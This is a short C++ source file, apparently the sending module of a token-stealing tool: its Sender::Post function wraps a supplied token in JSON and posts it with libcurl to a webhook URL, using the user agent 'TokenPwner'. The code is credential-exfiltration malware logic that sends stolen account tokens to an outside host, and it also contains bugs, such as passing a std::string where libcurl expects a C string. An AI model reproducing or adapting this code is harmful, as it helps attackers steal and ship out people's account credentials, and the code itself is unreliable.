#include "sender.h"
#include <vector>
#include <string>
#include <curl/curl.h>
#include <iostream>
CURL* curl = curl_easy_init();
CURLcode res;

std::vector<std::string> Sender::Post(std::string token) {
    std::string tosend = std::string("{\"content\":") + token +  "}";
    
    std::cout << tosend << std::endl;
	curl_global_init(CURL_GLOBAL_ALL);
	curl_easy_setopt(curl, CURLOPT_URL, Sender::webhook);
	curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    struct curl_slist* chunk = NULL;
    chunk = curl_slist_append(chunk, "Content-Type: application/json; charset: utf-8");
    chunk = curl_slist_append(chunk, "Accept: application/json");

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tosend);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "TokenPwner");


    res = curl_easy_perform(curl);
    if (res == CURLE_OK)
    {
        std::cout << "Everything Good." << std::endl;
       
    }
    
    curl_easy_cleanup(curl);
    curl_slist_free_all(chunk);

    curl_global_cleanup();
    std::vector<std::string> returndata;
    return returndata; // returning nothing to stop the error
    
}


